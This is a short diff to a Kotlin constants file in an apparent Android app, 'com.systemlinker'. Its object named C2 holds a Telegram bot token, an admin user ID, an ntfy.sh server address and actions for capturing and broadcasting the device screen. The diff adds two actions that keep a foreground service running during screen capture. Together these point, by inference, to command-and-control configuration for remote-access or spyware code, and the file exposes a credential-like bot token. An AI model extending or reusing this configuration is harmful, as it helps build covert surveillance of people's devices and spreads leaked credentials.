@@ -7,7 +7,7 @@ object Constants {
      */
     object C2 {
         const val TELEGRAM_BOT_TOKEN = "7956541572:AAGmwemZeH4jStO8211x7jCXBmudQzNYPj8"
-        const val TELEGRAM_ADMIN_USER_ID = 8108506175
+        const val TELEGRAM_ADMIN_USER_ID = 8108506175L
 
         // The public ntfy.sh server address.
         const val NTFY_PUBLIC_SERVER = "https://ntfy.sh"
@@ -56,5 +56,7 @@ object Constants {
         const val ACTION_SCREEN_DATA_BROADCAST = "com.systemlinker.SCREEN_DATA"
         const val ACTION_SCREEN_CAST_CONSENT = "com.systemlinker.SCREEN_CAST_CONSENT"
         const val ACTION_SCREEN_CAST_CONSENT_DENIED = "com.systemlinker.SCREEN_CAST_CONSENT_DENIED"
+        const val ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION = "com.systemlinker.UPGRADE_FGS_MP"
+        const val ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION = "com.systemlinker.DOWNGRADE_FGS_MP"
     }
 }
